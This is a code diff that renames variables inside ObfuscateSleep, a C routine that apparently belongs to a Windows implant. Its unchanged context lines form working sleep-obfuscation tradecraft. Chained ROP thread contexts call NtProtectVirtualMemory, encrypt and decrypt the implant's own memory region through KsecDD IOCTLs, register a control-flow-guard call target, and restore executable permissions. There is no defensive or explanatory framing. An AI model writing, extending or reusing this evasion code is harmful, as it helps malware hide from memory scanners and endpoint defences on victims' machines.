@@ -45,11 +45,11 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER Timeout) {
     OBJECT_ATTRIBUTES   src_object      = { };
     OBJECT_ATTRIBUTES   sec_object      = { };
 
-    PVOID       ContextMemPtr = { };
-    PVOID       ContextResPtr = { };
+    PVOID       target_region = { };
+    PVOID       resume_ptr = { };
 
     SIZE_T      ContextMemLen = 0;
-    SIZE_T      ContextResLen = 0;
+    SIZE_T      resume_len = 0;
 
     ULONG       ContextMemPrt = 0;
     ULONG       ContextResPrt = 0;
@@ -74,11 +74,11 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER Timeout) {
     PCONTEXT    context_res = { };
 
 
-    ContextMemPtr = C_PTR(Ctx->base.address);
+    target_region = C_PTR(Ctx->base.address);
     ContextMemLen = Ctx->base.size;
 
-    ContextResPtr = C_PTR(Ctx->base.address);
-    ContextResLen = Ctx->base.size;
+    resume_ptr = C_PTR(Ctx->base.address);
+    resume_len = Ctx->base.size;
 
     AddValidCallTarget(C_PTR(Ctx->win32.ExitThread));
     //AddValidCallTarget(C_PTR(Ctx->nt.NtContinue));
@@ -149,7 +149,7 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER Timeout) {
     rop_set->Rsp          = U_PTR(stolen->Rsp - 0x1000);
     rop_set->Rip          = U_PTR(Ctx->nt.NtProtectVirtualMemory);
     rop_set->Rcx          = U_PTR(NtCurrentProcess());
-    rop_set->Rdx          = U_PTR(&ContextMemPtr);
+    rop_set->Rdx          = U_PTR(&target_region);
     rop_set->R8           = U_PTR(&ContextMemLen);
     rop_set->R9           = PAGE_READWRITE;
 
@@ -171,9 +171,9 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER Timeout) {
     *(uintptr_t*)(rop_enc->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
     *(uintptr_t*)(rop_enc->Rsp + 0x28) = (uintptr_t) &ksecdd_iostat;
     *(uintptr_t*)(rop_enc->Rsp + 0x30) = (uintptr_t) IOCTL_KSEC_ENCRYPT_MEMORY;
-    *(uintptr_t*)(rop_enc->Rsp + 0x38) = (uintptr_t) ContextMemPtr;
+    *(uintptr_t*)(rop_enc->Rsp + 0x38) = (uintptr_t) target_region;
     *(uintptr_t*)(rop_enc->Rsp + 0x40) = (uintptr_t) (ContextMemLen + 0x1000 - 1) &~ (0x1000 - 1);
-    *(uintptr_t*)(rop_enc->Rsp + 0x48) = (uintptr_t) ContextMemPtr;
+    *(uintptr_t*)(rop_enc->Rsp + 0x48) = (uintptr_t) target_region;
     *(uintptr_t*)(rop_enc->Rsp + 0x50) = (uintptr_t) (ContextMemLen + 0x1000 - 1) &~ (0x1000 - 1);
 
     //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, rop_enc, NULL, NULL);
@@ -244,9 +244,9 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER Timeout) {
     *(uintptr_t*)(rop_dec->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert;
     *(uintptr_t*)(rop_dec->Rsp + 0x28) = (uintptr_t) &ksecdd_iostat;
     *(uintptr_t*)(rop_dec->Rsp + 0x30) = (uintptr_t) IOCTL_KSEC_DECRYPT_MEMORY;
-    *(uintptr_t*)(rop_dec->Rsp + 0x38) = (uintptr_t) ContextMemPtr;
+    *(uintptr_t*)(rop_dec->Rsp + 0x38) = (uintptr_t) target_region;
     *(uintptr_t*)(rop_dec->Rsp + 0x40) = (uintptr_t) ( ContextMemLen + 0x1000 - 1 ) &~ ( 0x1000 - 1 );
-    *(uintptr_t*)(rop_dec->Rsp + 0x48) = (uintptr_t) ContextMemPtr;
+    *(uintptr_t*)(rop_dec->Rsp + 0x48) = (uintptr_t) target_region;
     *(uintptr_t*)(rop_dec->Rsp + 0x50) = (uintptr_t) ( ContextMemLen + 0x1000 - 1 ) &~ ( 0x1000 - 1 );
 
     //ntstatus = Ctx->nt.NtQueueApcThread(rop_thread, Ctx->nt.NtContinue, rop_dec, NULL, NULL);
@@ -269,8 +269,8 @@ BOOL ObfuscateSleep(PCONTEXT fake_frame, PLARGE_INTEGER Timeout) {
     rop_res->Rsp          = U_PTR( stolen->Rsp - 0x1000 );
     rop_res->Rip          = U_PTR( Ctx->nt.NtProtectVirtualMemory );
     rop_res->Rcx          = U_PTR( NtCurrentProcess() );
-    rop_res->Rdx          = U_PTR( &ContextResPtr );
-    rop_res->R8           = U_PTR( &ContextResLen );
+    rop_res->Rdx          = U_PTR( &resume_ptr );
+    rop_res->R8           = U_PTR( &resume_len );
     rop_res->R9           = PAGE_EXECUTE_READWRITE;
 
     *(uintptr_t*)(rop_res->Rsp + 0x00) = (uintptr_t) Ctx->nt.NtTestAlert ;
